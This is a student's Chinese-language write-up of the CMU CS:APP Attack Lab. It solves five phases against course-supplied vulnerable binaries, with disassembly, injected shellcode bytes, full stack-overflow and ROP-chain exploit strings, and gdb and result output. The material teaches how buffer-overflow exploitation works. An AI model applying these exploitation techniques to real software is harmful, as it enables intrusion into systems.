## 1.实验目的

+ 给予两个二进制可执行文件`ctarget`与`rtarget`，两个文件都有缓冲区溢出bug，需要输入不同的攻击代码（特定字符串）来改变可执行文件的输出。

+ [课程目标与工具](http://csapp.cs.cmu.edu/3e/attacklab.pdf)

+ [README](http://csapp.cs.cmu.edu/3e/README-attacklab)

+ 用到的指令

  | Name                        | Use                 |
  | --------------------------- | ------------------- |
  | gcc -c file.s               | generaete .o file   |
  | objdump -d file.o >file.asm | Disassembly .o file |
  | touch file.txt              | generate file.txt   |

  

## 2.实验分析

### Part 1: CIA

#### Phase1

Level1提到在`ctarget`中由`test`函数调用`getbuf`函数，原本调用后会继续执行test里的内容，现在要求输入攻击字符串后执行touch1的内容。以下为三者的代码

```asm
0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	callq  400df0 <__printf_chk@plt>
  40198c:	48 83 c4 08          	add    $0x8,%rsp
  401990:	c3                   	retq   
  401991:	90                   	nop
  401992:	90                   	nop
  401993:	90                   	nop
  401994:	90                   	nop
  401995:	90                   	nop
  401996:	90                   	nop
  401997:	90                   	nop
  401998:	90                   	nop
  401999:	90                   	nop
  40199a:	90                   	nop
  40199b:	90                   	nop
  40199c:	90                   	nop
  40199d:	90                   	nop
  40199e:	90                   	nop
  40199f:	90                   	nop
  ...
  ...
  00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
  ..
  ..
  00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
```



可以看到在`getbuf`函数里面开劈了0x28的栈空间，在此函数内需填充40个字符，紧接着再填充`touch1`的起始地址`c0 17 40`(小端法)，则答案为：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

其中`00`可以被任何字符替代，将上述字符存入`attack.txt`并使用`hex2raw`转化，过程为：

```
zwen@zwen-virtual-machine:~/桌面/cmu-15213-labs/target1$ ./hex2raw <attack.txt> attack-raw.txt
zwen@zwen-virtual-machine:~/桌面/cmu-15213-labs/target1$ ./ctarget -q <attack-raw.txt
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 

```

Level1完成



#### Phase2

目标：注入代码，使得`ctarget`执行`touch2`函数而不返回`test`

Advice：

+ You will want to position a byte representation of the address of your injected code in such a way that ret instruction at the end of the code for getbuf will transfer control to it.
+ Recall that the first argument to a function is passed in register %rdi.
+ Your injected code should set the register to your cookie, and then use a ret instruction to transfer control to the first instruction in touch2.
+ Do not attempt to use jmp or call instructions in your exploit code. The encodings of destination addresses for these instructions are difficult to formulate. Use ret instructions for all transfers of control, even when you are not returning from a call.
+ See the discussion in Appendix B on how to use tools to generate the byte-level representations of instruction sequences.

提示已经写的很清楚了：

1. 在getbuf的返回地址处填写攻击代码的地址，以便getbuf返回后能执行攻击代码。
2. 攻击代码需设置rdi为cookie的值，然后用ret来将控制传递给touch2
3. 不要使用call或者jmp指令，使用ret指令来执行控制转移

则攻击代码为:

```asm
mov 0x59b997fa, %rdi
pushq $0x4017ec
ret
```

反汇编得到：

```

test.o：     文件格式 elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq   
```



则`48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3`为所需代码

注入后需修改getbuf的返回地址为攻击代码的起始地址，而攻击代码的起始地址为`rsp`的值，在gdb中查看得到：

```
(gdb) info r rsp
rsp            0x5561dc78	0x5561dc78
```

故应设置返回地址为0x5561dc78，则答案为:

```
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

使用`hex2raw`转换并执行后得到结果：

```
Starting program: /home/zwen/桌面/cmu-15213-labs/target1/ctarget -q <attack-raw.txt
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 

```



#### Phase3

目的：执行`touch3`而不返回到`test`

advice:

+ 将cookie转为ascii码
+ 用%rdi存放字符串的首地址
+ `hexmatch`函数与`strncmp`函数会向栈内存放数据，因此需考虑字符串的存放位置

分析：

由于上述两个函数会向栈内存放数据，为了保证字符串不被破坏，应将字符串存放在test函数的栈底端，则攻击代码为:

```asm
mov $0x5561dca8, %rdi #0x5561dca8由查看getbuf中初始rsp为0x5561dca0，然后加上返回地址所占的8个字节，则得到test函数的栈底地址
pushq $0x4018fa
retq
```

则答案为:

```
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
```

使用`hex2raw`转换并执行后得到结果：

```
zwen@zwen-virtual-machine:~/桌面/cmu-15213-labs/target1$ ./ctarget -q <attack-raw.txt
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 

```





### Part2 : ROP

使用code-injection  attacks来攻击`RTARGET`将会变得困难，原因如下

+ `Rtarget`使用 **栈随机化** 来使得攻击者无法确定注入的代码的位置
+ `Rtarget`使得栈区域变得 **不可执行**

因此人们通过 **执行已有代码** 而不是 **注入新代码** 使得攻击成为可能，其中最广泛使用的方法为 ***return-oriented programming*** ,这个方法将以`ret`结尾的代码段辨识为`gadget`

<img src="/Users/wenzheng/Library/Application Support/typora-user-images/image-20201007172227552.png" alt="image-20201007172227552" style="zoom:50%;" />

Figure 2描述了栈可以被设置为执行n个gadget的序列。图中，栈存储了一系列的gadget的地址，每个gadget都由`ret`指令结尾，当程序从这个结构开始执行ret指令时，它将启动一系列gadget执行，每个gadget末尾的ret指令会导致程序跳转到下一个gadget的开头。

#### Phase4

目的：对`rtarget`使用gadget来实现Phase2的攻击

使用由如下指令组成的并且只使用从`rax`到`rdi`8个初始寄存器的gadgets：

`movq, popq, ret, nop`

Some Advice:

+ 只使用从`start_farm`到`mid_farm`之间的gadget
+ 只使用两个gadgets
+ 当`gadgets`使用`pop`指令后，将会从栈中弹出数据，因此，你的攻击代码将包含gadget地址和数据的组合



思路分析：

+ 通过拆分组合gadget中的代码得到Phase2中的代码：

  ```asm
  mov 0x59b997fa, %rdi
  pushq $0x4017ec
  ret
  ```

+ 因为栈中数据无法被执行，因此向test的返回地址以及test的栈顶注入gadget的地址，以便跳转到gadget中执行

+ 向返回地址注入能够实现`pop %rax`的代码的地址，查阅得编码为`58`
+ 向返回地址+8处注入0x59b997fa
+ 向返回地址+16处注入能够实现`mov %rax, %rdi`的代码
+ 向返回地址+24处注入0x4017ec

**思路失败**：

+ 过程与结果为：

  ```
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  cc 40 19 00 00 00 00 00
  fa 97 b9 59 00 00 00 00
  c5 19 40 00 00 00 00 00
  ec 17 40 00 00 00 00 00
  
  zwen@zwen-virtual-machine:~/桌面/cmu-15213-labs/target1$ ./rtarget -q <attack-raw.txt
  Cookie: 0x59b997fa
  Type string:Ouch!: You caused a segmentation fault!
  Better luck next time
  FAIL: Would have posted the following:
  	user id	bovik
  	course	15213-f15
  	lab	attacklab
  	result	1:FAIL:0xffffffff:rtarget:0:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 40 19 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
  
  ```

  

反思：

可以直接找到能够编译出`popq %rdi`的代码为`5f`，找到它。。。？

**推翻：5f对应的地址为40141b，越过farm指定的范围，不可取**

重新审阅上述代码，发现`cc 40 19`处顺序有问题，应改为`cc 19 40`改正后重新编译再输入得到:

```
zwen@zwen-virtual-machine:~/桌面/cmu-15213-labs/target1$ ./rtarget -q <attack-raw.txt
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 

```



答案正确

另：正确答案不唯一，只要满足条件即可。翻阅farm发现有诸多地址都可以实现相同的功能，这里不一一列举。



#### Phase5(Extra Phase)

摘录一段老爷子的话：

> Before you take on the Phase 5, pause to consider what you have accomplished so far. In Phases 2 and 3, you caused a program to execute machine code of your own design. If CTARGET had been a network server, you could have injected your own code into a distant machine. In Phase 4, you circumvented two of the main devices modern systems use to thwart buffer overflow attacks. Although you did not inject your own code, you were able inject a type of program that operates by stitching together sequences of existing code. You have also gotten 95/100 points for the lab. That’s a good score. If you have other pressing obligations consider stopping right now.
> Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.

目的：使用ROP实现Phase3

要求与建议：

+ 全部的gadgets均可使用
+ 新增`movl`的使用，注意`movl`指令会将目标寄存器的高4字节置0
+ 标准答案要求使用8个gadgets（不要求互不相同）



思路分析：

通过ROP实现一下代码的功能：

```asm
mov $0x5561dca8, %rdi #0x5561dca8由查看getbuf中初始rsp为0x5561dca0，然后加上返回地址所占的8个字节，则得到test函数的栈底地址
pushq $0x4018fa
retq

/* 48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00					a0 a8 b0 b8 
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61 */  getbuf中返回地址为0x5561dca0？
```

思路分析：

+ 将cookie的ascii码存放在address处
+ push address的地址
+ pop出address给rax
+ `mov $address, %rdi` address地址未定

+ 注入0x4018fa，返回

得到答案：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 dc 61 55 00 00 00 00 //字符串起始地址
cc 19 40 00 00 00 00 00 //pop %rax
c5 19 40 00 00 00 00 00 //mov %rax, %rdi
fa 18 40 00 00 00 00 00 //
35 39 62 39 39 37 66 61
```

**结果不正确，原因：栈随机化使得无法提前获得字符串的地址**

修正：拿到rsp后进行动态偏移

[1. 知乎用户@Yannick的答案](https://zhuanlan.zhihu.com/p/104340864)(**个人认为不够标准，因为使用了不在farm范围内的gadget，5e**)

构造如下的情况：

```
1.拿到rsp存的地址
2.对这个地址进行加减常量运算，使其指向cookie的地址
3.把这个地址放到rdi中
4.调用touch3
即 %rdi = %rsp + bias = address of cookie
```

关键指令为:

```asm
0x401a06:
	mov %rsp, %rax
	retq
0x4019a2:
	mov %rax, %rdi
	retq
0x401383:
	pop %rsi
	retq
0x4019d6:
	lea (%rdi, %rsi, 1), %rax
	retq
```

则答案为：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00 //0x401a06
a2 19 40 00 00 00 00 00 //0x4019a2, %rdi = rax = rsp
83 13 40 00 00 00 00 00 //将栈顶元素pop至rsi
30 00 00 00 00 00 00 00	//rsi = 0x30
d6 19 40 00 00 00 00 00 //rax = rdi + rsi
a2 19 40 00 00 00 00 00 //rdi = rax
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
```

经验证后答案正确



2.改进：

```
使用pop rax而不是pop rsi，前者可在farm范围内找到，地址为0x4019ab
将偏移地址存储到rax后
movl eax, edx
movl edx, ecx
movl ecs, rsi
即可将rax的值传递到rsi
之后的过程与上述相同
```



## 3.实验心得

+ 感觉都不难，但是phase1,2,3,5都没有独立完成，phase4想了很久，完成98%，最后因一对数字混乱而出错很遗憾
+ [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) 有机会可以学一学
+ 不止实验提到的farm内的地址可以作为gadget，任何一个地址只要组合得当都可以得到类似的结果，应放开眼界